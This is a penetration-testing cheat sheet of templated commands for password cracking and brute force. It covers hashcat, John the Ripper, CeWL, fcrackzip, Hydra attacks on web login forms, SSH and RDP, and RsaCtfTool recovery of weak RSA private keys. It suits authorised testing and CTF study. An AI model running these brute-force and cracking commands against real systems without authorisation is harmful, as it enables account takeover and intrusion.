---
id: 2b710a7c-45d1-44b5-b430-59c74c41640c
name: Password Cracking and Brute Force
type: cheatsheet
verified: true
created_at: '2019-09-24T22:00:40.626698+00:00'
updated_at: '2023-06-06T15:15:46.458166+00:00'
---

# Password Cracking and Brute Force

**Status**: ✓ Verified

# Description

Hash extraction, password cracking, and generating password lists.

## Hash Identification

**Command** ([[hashid Identify Hashes in a File]]):

```bash
hashid $_FILENAME
```

**Command** ([[Hashcat Find Hash Mode from Example Hashes]]):

```bash
hashcat --example-hashes | grep -C 2 $_VALUE
```

## List Generation

**Command** ([[CEWL Generate a Password List Using a Website's Content]]):

```bash
cewl $_TARGET_IP -d $_DEPTH -m $_MAX_SIZE -w $_WORDLIST
```

**Command** ([[hashcat Mutate a Password Using Mask Attack]]):

```bash
hashcat --stdout -a 3 $_BASE_PASSWORD?d?d?d?s > $_WORDLIST
```

Mask Attack Character Set

- ?    Charset

- l    abcdefghijklmnopqrstuvwxyz

- u    ABCDEFGHIJKLMNOPQRSTUVWXYZ

- d    0123456789

- h    0123456789abcdef

- H    0123456789ABCDEF

- s    **!**"#$%&'()*+,-./:;<=>?@[\]^_`{|}~

- a    ?l?u?d?s

- b    0x00 - 0xff

**Command** ([[John the Ripper Mutate a Password List Using Rules]]):

```bash
john --wordlist=$_WORDLIST --rules --stdout > $_MUTATED_WORDLIST
```

## Dictionary Brute Force

**Command** ([[John the Ripper Brute Force a Hash File]]):

```bash
john --wordlist=$_WORDLIST $_HASH_FILE
```

**Command** ([[hashcat Brute Force a sha-512 crypt password]]):

```bash
hashcat -m 1800 $_HASH_FILE $_WORDLIST
```

Note: Use --force if cracking without a GPU when performance losses are not an issue

**Command** ([[fcrackzip Dictionary Brute Force a Zip File]]):

```bash
fcrackzip -v -u $FILENAME -D -p $WORDLIST
```

**Command** ([[fcrackzip Charset Brute Force a Zip File]]):

```bash
fcrackzip -b -c '$_CHAR1$_CHAR2' -l $_MIN_SIZE-$_MAX_SIZE -u  $_WORDLIST
```

- a   include all lowercase characters [a-z]

- A   include all uppercase characters [A-Z]

- 1   include the digits [0-9]

- **!**   include [**!:**$%**&/()**=?**{**[]**}**+*~#]

- **:**   the following characters upto the end of the specification string are included **in** the character set.

For example, a1**:**$% selects lowercase characters, digits and the dollar and percent signs.

## Service Brute Forcing

**Command** ([[hydra -L $_USERNAME_LIST -P $_PASSWORD_LIST $_TARG]]):

```bash
hydra -L $_USERNAME_LIST -P $_PASSWORD_LIST $_TARGET_IP http-post-form '$_PATH:username=^USER^&password=^PASS^&Login=Login:$_NEGATIVE_RESULT'
```

**Command** ([[Hydra Dictionary Brute Force SSH]]):

```bash
hydra -L $_USER_LIST -P $_WORDLIST ssh://$TARGET_IP
```

**Command** ([[Hydra Dictionary Brute Force Remote Desktop Protocol (RDP)]]):

```bash
hydra -L $USER_LIST -P $PASSWORD_LIST rdp://$TARGET_IP
```

## RSA Keys

**Command** ([[RsaCtfTool Dump parameters from a public key]]):

```bash
RsaCtfTool.py --dumpkey --key  $_ID_RSA.PUB
```

**Command** ([[RsaCtfTool Extract Weak Private Key From Public Key]]):

```bash
RsaCtfTool.py --publickey $_ID_RSA.PUB --private
```
